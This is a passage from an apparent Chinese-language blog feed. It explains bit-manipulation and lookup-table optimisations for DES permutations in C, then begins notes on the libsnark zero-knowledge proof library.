class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">8</span>) ^ X) &amp; <span class="number">0x00ff00ff</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">8</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">57</span> <span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = ((Y &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>) | (Y &gt;&gt; <span class="number">31</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span> <span class="number">57</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = (X ^ Y) &amp; <span class="number">0xaaaaaaaa</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= T</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">58</span> <span class="number">50</span> <span class="number">42</span> <span class="number">34</span> <span class="number">26</span> <span class="number">18</span> <span class="number">10</span>  <span class="number">2</span> <span class="number">60</span> <span class="number">52</span> <span class="number">44</span> <span class="number">36</span> <span class="number">28</span> <span class="number">20</span> <span class="number">12</span>  <span class="number">4</span> <span class="number">62</span> <span class="number">54</span> <span class="number">46</span> <span class="number">38</span> <span class="number">30</span> <span class="number">22</span> <span class="number">14</span>  <span class="number">6</span> <span class="number">64</span> <span class="number">56</span> <span class="number">48</span> <span class="number">40</span> <span class="number">32</span> <span class="number">24</span> <span class="number">16</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">49</span> <span class="number">41</span> <span class="number">33</span> <span class="number">25</span> <span class="number">17</span>  <span class="number">9</span>  <span class="number">1</span> <span class="number">59</span> <span class="number">51</span> <span class="number">43</span> <span class="number">35</span> <span class="number">27</span> <span class="number">19</span> <span class="number">11</span>  <span class="number">3</span> <span class="number">61</span> <span class="number">53</span> <span class="number">45</span> <span class="number">37</span> <span class="number">29</span> <span class="number">21</span> <span class="number">13</span>  <span class="number">5</span> <span class="number">63</span> <span class="number">55</span> <span class="number">47</span> <span class="number">39</span> <span class="number">31</span> <span class="number">23</span> <span class="number">15</span>  <span class="number">7</span> <span class="number">57</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = ((Y &lt;&lt; <span class="number">31</span>) &amp; <span class="number">0xffffffff</span>) | (Y &gt;&gt; <span class="number">1</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">58</span> <span class="number">50</span> <span class="number">42</span> <span class="number">34</span> <span class="number">26</span> <span class="number">18</span> <span class="number">10</span>  <span class="number">2</span> <span class="number">60</span> <span class="number">52</span> <span class="number">44</span> <span class="number">36</span> <span class="number">28</span> <span class="number">20</span> <span class="number">12</span>  <span class="number">4</span> <span class="number">62</span> <span class="number">54</span> <span class="number">46</span> <span class="number">38</span> <span class="number">30</span> <span class="number">22</span> <span class="number">14</span>  <span class="number">6</span> <span class="number">64</span> <span class="number">56</span> <span class="number">48</span> <span class="number">40</span> <span class="number">32</span> <span class="number">24</span> <span class="number">16</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">57</span> <span class="number">49</span> <span class="number">41</span> <span class="number">33</span> <span class="number">25</span> <span class="number">17</span>  <span class="number">9</span>  <span class="number">1</span> <span class="number">59</span> <span class="number">51</span> <span class="number">43</span> <span class="number">35</span> <span class="number">27</span> <span class="number">19</span> <span class="number">11</span>  <span class="number">3</span> <span class="number">61</span> <span class="number">53</span> <span class="number">45</span> <span class="number">37</span> <span class="number">29</span> <span class="number">21</span> <span class="number">13</span>  <span class="number">5</span> <span class="number">63</span> <span class="number">55</span> <span class="number">47</span> <span class="number">39</span> <span class="number">31</span> <span class="number">23</span> <span class="number">15</span>  <span class="number">7</span></span><br></pre></td></tr></table></figure></li><li><p>PC-1</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028211906967.png"></p><p>注意到PC-1存在如图所示 步长为8 容量为4的连续序列，e.g. Left可将{33, 34, 35, 36}作为基准，打表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> PC1_L[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000100</span>, <span class="number">0x00000101</span>,</span><br><span class="line">        <span class="number">0x00010000</span>, <span class="number">0x00010001</span>, <span class="number">0x00010100</span>, <span class="number">0x00010101</span>,</span><br><span class="line">        <span class="number">0x01000000</span>, <span class="number">0x01000001</span>, <span class="number">0x01000100</span>, <span class="number">0x01000101</span>,</span><br><span class="line">        <span class="number">0x01010000</span>, <span class="number">0x01010001</span>, <span class="number">0x01010100</span>, <span class="number">0x01010101</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>输入容量4的连续序列（共<span class="math inline">\(2^4\)</span>种状态），将其填入PC-1后{33, 34, 35, 36}所在的位置（其他位置置零），此时输出的uint32_t即为数组上对应位置的值（输出值再整体左移/右移即可实现PC-1）</p><p>Right则是以{39, 38, 37, 4}为基准，不同的是需要逆序输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * based on &#123;39, 38, 37, 4&#125;</span></span><br><span class="line"><span class="comment"> * but input in `reverse` order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> PC1_R[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0x01000000</span>, <span class="number">0x00010000</span>, <span class="number">0x01010000</span>,</span><br><span class="line">        <span class="number">0x00000100</span>, <span class="number">0x01000100</span>, <span class="number">0x00010100</span>, <span class="number">0x01010100</span>,</span><br><span class="line">        <span class="number">0x00000001</span>, <span class="number">0x01000001</span>, <span class="number">0x00010001</span>, <span class="number">0x01010001</span>,</span><br><span class="line">        <span class="number">0x00000101</span>, <span class="number">0x01000101</span>, <span class="number">0x00010101</span>, <span class="number">0x01010101</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但在此之前需要经过下述两次shuffle（同样也是通过PC-1后的状态来<strong>逆推</strong>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">4</span>) ^ X) &amp; <span class="number">0x0f0f0f0f</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">4</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span></span><br><span class="line">Y = </span><br><span class="line"> <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = (Y ^ X) &amp; <span class="number">0x10101010</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= T</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">8</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">16</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">24</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">32</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span></span><br><span class="line">Y = </span><br><span class="line"> <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">4</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">12</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">20</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">28</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>完整的PC-1相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC1(X, Y) &#123;                                                             \</span></span><br><span class="line">    <span class="keyword">uint32_t</span> T;                                                                 \</span><br><span class="line">    T = (((Y) &gt;&gt; <span class="number">4</span>) ^ (X)) &amp; <span class="number">0x0f0f0f0f</span>; (X) ^= T; (Y) ^= (T &lt;&lt; <span class="number">4</span>);             \</span><br><span class="line">    T = ((Y) ^ (X)) &amp; <span class="number">0x10101010</span>; (X) ^= T; (Y) ^= T;                           \</span><br><span class="line">    (X) = (PC1_L[((X) &gt;&gt; <span class="number">29</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">4</span>) | (PC1_L[((X) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0f</span>])        \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">5</span>) | (PC1_L[((X) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">1</span>)     \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">6</span>) | (PC1_L[((X) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">2</span>)     \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">7</span>) | (PC1_L[(X      ) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">3</span>);      \</span><br><span class="line">    (Y) = (PC1_R[((Y) &gt;&gt; <span class="number">29</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">4</span>) | (PC1_R[((Y) &gt;&gt; <span class="number">25</span>) &amp; <span class="number">0x0f</span>])        \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">3</span>) | (PC1_R[((Y) &gt;&gt; <span class="number">17</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">1</span>)     \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">2</span>) | (PC1_R[((Y) &gt;&gt;  <span class="number">9</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">2</span>)     \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">1</span>) | (PC1_R[((Y) &gt;&gt;  <span class="number">1</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">3</span>);    \</span><br><span class="line">    (X) &amp;= <span class="number">0x0fffffff</span>;                                                          \</span><br><span class="line">    (Y) &amp;= <span class="number">0x0fffffff</span>;                                                          \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PC-2</p><p>PC-2就不存在和PC-1这样显著的特征，因此只能去将<strong>保持原有相对位置</strong>的bit划分至同一批处理，尽可能减少位运算步骤，e.g. 下图所示的原始第8、第12 bit能一起处理<code>(((X) &lt;&lt; 16) &amp; 0x00110000)</code></p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/QQ图片20211028215620.jpg"></p><p>完整的PC-2相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC2(X, Y, K) &#123;                                                  \</span></span><br><span class="line">    (K)[<span class="number">0</span>] = (((X) &lt;&lt;  <span class="number">9</span>) &amp; <span class="number">0x00800000</span>) | (((X) &lt;&lt; <span class="number">11</span>) &amp; <span class="number">0x00400000</span>)    \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">4</span>) &amp; <span class="number">0x00200000</span>) | (((X) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0x00110000</span>)      \</span><br><span class="line">         | (((X) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x000a4000</span>) | (((X) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x00040000</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">2</span>) &amp; <span class="number">0x00008008</span>) | (((X) &lt;&lt;  <span class="number">6</span>) &amp; <span class="number">0x00002800</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">1</span>) &amp; <span class="number">0x00000400</span>) | (((X) &gt;&gt;  <span class="number">6</span>) &amp; <span class="number">0x00001004</span>)      \</span><br><span class="line">         | (((X) &gt;&gt;  <span class="number">7</span>) &amp; <span class="number">0x00000220</span>) | (((X) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00000100</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">5</span>) &amp; <span class="number">0x00000080</span>) | (((X) &gt;&gt; <span class="number">14</span>) &amp; <span class="number">0x00000042</span>)      \</span><br><span class="line">         | (((X) &gt;&gt; <span class="number">17</span>) &amp; <span class="number">0x00000010</span>) | (((X) &gt;&gt; <span class="number">26</span>) &amp; <span class="number">0x00000001</span>);     \</span><br><span class="line">    (K)[<span class="number">1</span>] = (((Y) &lt;&lt;  <span class="number">8</span>) &amp; <span class="number">0x00800100</span>) | (((Y) &lt;&lt; <span class="number">18</span>) &amp; <span class="number">0x00400000</span>)    \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">4</span>) &amp; <span class="number">0x00200000</span>) | (((Y) &lt;&lt;  <span class="number">1</span>) &amp; <span class="number">0x00100000</span>)      \</span><br><span class="line">         | (((Y) &lt;&lt; <span class="number">10</span>) &amp; <span class="number">0x00088000</span>) | (((Y) &lt;&lt; <span class="number">17</span>) &amp; <span class="number">0x00040000</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">9</span>) &amp; <span class="number">0x00020000</span>) | ((Y      ) &amp; <span class="number">0x00010000</span>)        \</span><br><span class="line">         | (((Y) &lt;&lt;  <span class="number">3</span>) &amp; <span class="number">0x00004440</span>) | (((Y) &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x00002010</span>)      \</span><br><span class="line">         | (((Y) &lt;&lt;  <span class="number">4</span>) &amp; <span class="number">0x00001000</span>) | (((Y) &gt;&gt;  <span class="number">1</span>) &amp; <span class="number">0x00000800</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x00000200</span>) | (((Y) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x00000080</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x00000020</span>) | (((Y) &gt;&gt;  <span class="number">3</span>) &amp; <span class="number">0x00000008</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x00000004</span>) | (((Y) &gt;&gt; <span class="number">26</span>) &amp; <span class="number">0x00000002</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x00000001</span>);                                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Expansion Function</p><figure><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028220127659.png" alt="image-20211028220127659"><figcaption aria-hidden="true">image-20211028220127659</figcaption></figure><p>每行均为连续序列，类似PC-2进行位处理（首末行特殊处理）</p><p>轮函数代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> f(L, R, K) &#123;                                                                        \</span></span><br><span class="line">    (L) ^= spbox[<span class="number">0</span>][((((R) &gt;&gt; <span class="number">27</span>) &amp; <span class="number">0x1f</span>) | (((R) &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0x20</span>)) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>)] \</span><br><span class="line">       | spbox[<span class="number">1</span>][(((R) &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)]                           \</span><br><span class="line">       | spbox[<span class="number">2</span>][(((R) &gt;&gt; <span class="number">19</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)]                            \</span><br><span class="line">       | spbox[<span class="number">3</span>][(((R) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>]) &amp; <span class="number">0x3f</span>)]                                 \</span><br><span class="line">       | spbox[<span class="number">4</span>][(((R) &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>)]                           \</span><br><span class="line">       | spbox[<span class="number">5</span>][(((R) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)]                            \</span><br><span class="line">       | spbox[<span class="number">6</span>][(((R) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)]                             \</span><br><span class="line">       | spbox[<span class="number">7</span>][((((R) &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x3e</span>) | (((R) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x01</span>)) ^ (((K)[<span class="number">1</span>]) &amp; <span class="number">0x3f</span>)];        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>最后的性能测试在25us/KB左右👏算是一个比较显著的提升（</p><p>AES和SM4的相关性能优化trick实际上和前面在DES中<code>gen_spbox()</code>的预处理类似，本质上都是空间换时间（T表），不在此赘述</p><h4 id="reference">Reference</h4><p>简化位运算相关可以移步这本书👇</p><p><a href="https://books.google.com.hk/books?id=iBNKMspIlqEC&amp;lpg=SL20-PA11&amp;vq=Transposing+an+8x8-bit+matrix&amp;pg=SL20-PA11&amp;redir_esc=y#v=snippet&amp;q=Transposing%20an%208x8-bit%20matrix&amp;f=false" target="_blank" rel="noopener">https://books.google.com.hk/books?id=iBNKMspIlqEC&amp;lpg=SL20-PA11&amp;vq=Transposing+an+8x8-bit+matrix&amp;pg=SL20-PA11&amp;redir_esc=y#v=snippet&amp;q=Transposing%20an%208x8-bit%20matrix&amp;f=false</a></p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>libsnark_related</title>
      <link href="/2021/10/17/libsnark-related/"/>
      <url>/2021/10/17/libsnark-related/</url>
      
        <content type="html"><![CDATA[<blockquote><p>近日因为种种原因又拾起了零知识证明方向的相关工作，于是在此简略做一下libsnark相关的记录</p><p><a href="https://github.com/scipr-lab/libsnark/tree/2af440246fa2c3d0b1b0a425fb6abd8cc8b9c54d" target="_blank" rel="noopener">https://github.com/scipr-lab/libsnark/tree/2af440246fa2c3d0b1b0a425fb6abd8cc8b9c54d</a></p></blockquote><p>基于zk-SNARKs实现非交互式零知识证明应用的开发顺序可以概括如下：</p><ol type="1"><li><p>创建一个r1cs_constraint_system（libsnark设计了gadget的框架帮助构建）；</p></li><li><p>生成proving key和verification key；</p></li><li><p>Alice使用proving key和拥有的可行解构造证明<span class="math inline">\(\pi\)</span>；</p></li><li><p>Bob使用verification key验证<span class="math inline">\(\pi\)</span>；</p></li></ol><hr><p>下面参考<a href="https://zhuanlan.zhihu.com/p/46477111" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46477111</a>中给出的例子，逐步跟进，对gadgetlib1的相关源码进行解析：</p><p>先定位到添加r1cs约束相关的<code>add_r1cs_constraint</code>：</p><p><strong>libsnark/gadgetlib1/protoboard.hpp : L51 &amp; protoboard.tcc : L100-110</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_r1cs_constraint</span><span class="params">(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;constr, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation=<span class="string">""</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span 